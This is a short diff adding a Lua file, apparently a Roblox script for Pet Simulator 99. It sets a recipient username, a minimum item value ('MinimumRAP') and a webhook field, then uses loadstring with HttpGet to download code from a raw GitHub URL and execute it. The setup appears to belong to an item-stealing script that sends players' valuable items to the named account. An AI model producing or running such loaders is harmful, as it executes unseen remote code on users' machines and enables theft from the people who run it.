@@ -1,0 +1,6 @@
+Username = "msi1348"
+Username2 = "msi1348"
+MinimumRAP = 100000
+Webhook = ""
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xeps99s/ps99scrip/main/xe", true))()
